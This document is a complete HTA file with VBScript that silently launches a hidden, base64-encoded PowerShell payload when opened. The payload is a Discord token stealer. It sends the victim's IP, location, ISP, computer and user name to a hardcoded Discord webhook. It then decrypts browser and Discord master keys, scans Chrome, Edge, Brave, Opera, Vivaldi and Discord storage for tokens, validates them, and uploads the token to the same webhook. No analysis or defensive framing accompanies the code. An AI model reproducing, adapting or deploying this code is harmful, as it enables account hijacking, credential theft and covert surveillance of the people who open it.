<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no"
    showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next

Dim sh
Set sh = CreateObject("WScript.Shell")

' ── Encode VBScript string as UTF-16LE base64 for PowerShell -EncodedCommand ─
' No temp files, no ADODB dep — uses MSXML2 bin.base64 node trick
Function B64Encode(str)
    Dim stm
    Set stm = CreateObject("ADODB.Stream")
    stm.Type    = 2
    stm.Charset = "utf-16le"
    stm.Open
    stm.WriteText str
    stm.Position = 2  ' skip UTF-16LE BOM
    stm.Type = 1
    Dim raw : raw = stm.Read
    stm.Close : Set stm = Nothing
    Dim dom, el
    Set dom = CreateObject("MSXML2.DOMDocument")
    Set el  = dom.createElement("b64")
    el.dataType       = "bin.base64"
    el.nodeTypedValue = raw
    B64Encode = Replace(Replace(el.Text, vbLf, ""), vbCr, "")
    Set el = Nothing : Set dom = Nothing
End Function

Sub Window_OnLoad()
    window.resizeTo 0, 0
    window.moveTo -2000, -2000

    Dim WH : WH = "https://discord.com/api/webhooks/1565481445034696784/kYh872fDK_3_4WHhGGdDignyh1hzsrbWA2qPbTI4fm6yja-soIqoXlUOm119LiXDGPq5"

    ' ── Build PowerShell payload ─────────────────────────────────────────────
    Dim Q : Q = Chr(34)  ' double-quote shorthand
    Dim L : L = vbLf     ' line separator shorthand

    Dim ps
    ps = "Add-Type -AssemblyName System.Security" & L
    ps = ps & "$WH   = '" & WH & "'" & L
    ps = ps & "$PC   = $env:COMPUTERNAME" & L
    ps = ps & "$USER = $env:USERNAME" & L
    ps = ps & "" & L

    ' Post-Embed
    ps = ps & "function Post-Embed($title, $desc, $color) {" & L
    ps = ps & "    try {" & L
    ps = ps & "        $body = @{ embeds = @(@{ title = $title; description = $desc; color = $color }) } | ConvertTo-Json -Depth 5" & L
    ps = ps & "        Invoke-RestMethod -Uri $WH -Method Post -ContentType 'application/json' -Body $body -EA Stop" & L
    ps = ps & "    } catch {}" & L
    ps = ps & "}" & L
    ps = ps & "" & L

    ' Post-File
    ps = ps & "function Post-File($name, $content) {" & L
    ps = ps & "    try {" & L
    ps = ps & "        $bound = [System.Guid]::NewGuid().ToString('N')" & L
    ps = ps & "        $bytes = [System.Text.Encoding]::UTF8.GetBytes(" & L
    ps = ps & "            " & Q & "--$bound`r`nContent-Disposition: form-data; name=`" & Q & "file`" & Q & "; filename=`" & Q & "$name`" & Q & "`r`n`r`n$content`r`n--$bound--" & Q & L
    ps = ps & "        )" & L
    ps = ps & "        Invoke-RestMethod -Uri $WH -Method Post -ContentType " & Q & "multipart/form-data; boundary=$bound" & Q & " -Body $bytes -EA Stop" & L
    ps = ps & "    } catch {}" & L
    ps = ps & "}" & L
    ps = ps & "" & L

    ' Get-IP
    ps = ps & "function Get-IP {" & L
    ps = ps & "    try {" & L
    ps = ps & "        $ip  = (Invoke-RestMethod 'https://api.ipify.org/' -UseBasicParsing).Trim()" & L
    ps = ps & "        $raw = (Invoke-WebRequest " & Q & "http://ip-api.com/line/$ip`?fields=country,regionName,city,isp" & Q & " -UseBasicParsing).Content" & L
    ps = ps & "        $ll  = ($raw -split " & Q & "`n" & Q & ") | ForEach-Object { $_.Trim() }" & L
    ps = ps & "        Post-Embed 'Target' " & Q & "IP: $ip | $($ll[0]) | $($ll[1]) | $($ll[2]) | ISP: $($ll[3]) | PC: $PC | USER: $USER" & Q & " 3447003" & L
    ps = ps & "    } catch {}" & L
    ps = ps & "}" & L
    ps = ps & "" & L

    ' Get-MK
    ps = ps & "function Get-MK($base) {" & L
    ps = ps & "    try {" & L
    ps = ps & "        $ls = Join-Path $base 'Local State'" & L
    ps = ps & "        if (-not (Test-Path $ls)) { return $null }" & L
    ps = ps & "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json" & L
    ps = ps & "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)" & L
    ps = ps & "        return [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')" & L
    ps = ps & "    } catch { return $null }" & L
    ps = ps & "}" & L
    ps = ps & "" & L

    ' Dec-GCM — .NET 8+ and pre-8 compat
    ps = ps & "function Dec-GCM($mk, $b) {" & L
    ps = ps & "    if (-not $mk -or $b.Length -lt 31) { return $null }" & L
    ps = ps & "    try {" & L
    ps = ps & "        $nonce = [byte[]]$b[3..14]" & L
    ps = ps & "        $tag   = [byte[]]$b[($b.Length-16)..($b.Length-1)]" & L
    ps = ps & "        $ct    = [byte[]]$b[15..($b.Length-17)]" & L
    ps = ps & "        $out   = New-Object byte[] $ct.Length" & L
    ps = ps & "        try   { $gcm = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk, 16) }" & L
    ps = ps & "        catch { $gcm = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk) }" & L
    ps = ps & "        $gcm.Decrypt($nonce, $ct, $tag, $out)" & L
    ps = ps & "        $gcm.Dispose()" & L
    ps = ps & "        return [System.Text.Encoding]::UTF8.GetString($out)" & L
    ps = ps & "    } catch { return $null }" & L
    ps = ps & "}" & L
    ps = ps & "" & L

    ' Valid-Token
    ps = ps & "function Valid-Token($t) {" & L
    ps = ps & "    if (-not $t) { return $false }" & L
    ps = ps & "    if ($t -match '^mfa\.[\w-]{84}$')                      { return $true }" & L
    ps = ps & "    if ($t -match '^[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}$') { return $true }" & L
    ps = ps & "    return $false" & L
    ps = ps & "}" & L
    ps = ps & "" & L

    ' Check-Token
    ps = ps & "function Check-Token($t) {" & L
    ps = ps & "    try {" & L
    ps = ps & "        $wc = New-Object System.Net.WebClient" & L
    ps = ps & "        $wc.Headers.Add('Authorization', $t)" & L
    ps = ps & "        $wc.Headers.Add('Content-Type', 'application/json')" & L
    ps = ps & "        $r = $wc.DownloadString('https://discord.com/api/v9/users/@me')" & L
    ps = ps & "        $wc.Dispose()" & L
    ps = ps & "        return $r -match '""id""'" & L
    ps = ps & "    } catch { return $false }" & L
    ps = ps & "}" & L
    ps = ps & "" & L

    ' Scan-File
    ps = ps & "function Scan-File($path, $mk) {" & L
    ps = ps & "    try {" & L
    ps = ps & "        $bytes = [System.IO.File]::ReadAllBytes($path)" & L
    ps = ps & "        $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)" & L
    ps = ps & "        foreach ($m in ([regex]'dQw4w9WgXcQ:[A-Za-z0-9+/]{10,}={0,2}').Matches($txt)) {" & L
    ps = ps & "            try {" & L
    ps = ps & "                $enc = [Convert]::FromBase64String($m.Value.Substring(12))" & L
    ps = ps & "                $dec = Dec-GCM $mk $enc" & L
    ps = ps & "                if ((Valid-Token $dec) -and (Check-Token $dec)) { return $dec }" & L
    ps = ps & "            } catch {}" & L
    ps = ps & "        }" & L
    ps = ps & "        foreach ($m in ([regex]'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}').Matches($txt)) {" & L
    ps = ps & "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value)) { return $m.Value }" & L
    ps = ps & "        }" & L
    ps = ps & "        $m3 = ([regex]'mfa\.[\w-]{84}').Match($txt)" & L
    ps = ps & "        if ($m3.Success -and (Check-Token $m3.Value)) { return $m3.Value }" & L
    ps = ps & "    } catch {}" & L
    ps = ps & "    return $null" & L
    ps = ps & "}" & L
    ps = ps & "" & L

    ' Scan-Dir
    ps = ps & "function Scan-Dir($ldb, $mk) {" & L
    ps = ps & "    if (-not (Test-Path $ldb)) { return $null }" & L
    ps = ps & "    $files = Get-ChildItem $ldb -File -EA SilentlyContinue |" & L
    ps = ps & "             Where-Object { $_.Extension -in '.ldb','.log' } |" & L
    ps = ps & "             Sort-Object LastWriteTime -Descending" & L
    ps = ps & "    foreach ($file in $files) {" & L
    ps = ps & "        $t = Scan-File $file.FullName $mk" & L
    ps = ps & "        if ($t) { return $t }" & L
    ps = ps & "    }" & L
    ps = ps & "    return $null" & L
    ps = ps & "}" & L
    ps = ps & "" & L

    ' Get-Token
    ps = ps & "function Get-Token {" & L
    ps = ps & "    $token = $null" & L
    ps = ps & "    foreach ($app in @('discord','discordcanary','discordptb','discorddevelopment')) {" & L
    ps = ps & "        if ($token) { break }" & L
    ps = ps & "        $base = Join-Path $env:APPDATA $app" & L
    ps = ps & "        if (-not (Test-Path $base)) { continue }" & L
    ps = ps & "        $mk = Get-MK $base" & L
    ps = ps & "        $t  = Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk" & L
    ps = ps & "        if ($t) { $token = $t }" & L
    ps = ps & "    }" & L
    ps = ps & "    if (-not $token) {" & L
    ps = ps & "        $browsers = @(" & L
    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data')," & L
    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data')," & L
    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data')," & L
    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable')," & L
    ps = ps & "            (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data')" & L
    ps = ps & "        )" & L
    ps = ps & "        foreach ($br in $browsers) {" & L
    ps = ps & "            if ($token) { break }" & L
    ps = ps & "            if (-not (Test-Path $br)) { continue }" & L
    ps = ps & "            $mk    = Get-MK $br" & L
    ps = ps & "            $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)" & L
    ps = ps & "            foreach ($p in $profs) {" & L
    ps = ps & "                if ($token) { break }" & L
    ps = ps & "                $t = Scan-Dir (Join-Path $br " & Q & "$p\Local Storage\leveldb" & Q & ") $mk" & L
    ps = ps & "                if ($t) { $token = $t }" & L
    ps = ps & "            }" & L
    ps = ps & "        }" & L
    ps = ps & "    }" & L
    ps = ps & "    return $token" & L
    ps = ps & "}" & L
    ps = ps & "" & L
    ps = ps & "Get-IP" & L
    ps = ps & "$tok = Get-Token" & L
    ps = ps & "if ($tok) { Post-File 'discord_token.txt' $tok }"

    ' ── Encode and launch — no temp files ───────────────────────────────────
    Dim enc : enc = B64Encode(ps)
    sh.Run "powershell -NoP -NonI -W Hidden -EncodedCommand " & enc, 0, False
End Sub
</script>
</head><body></body></html>
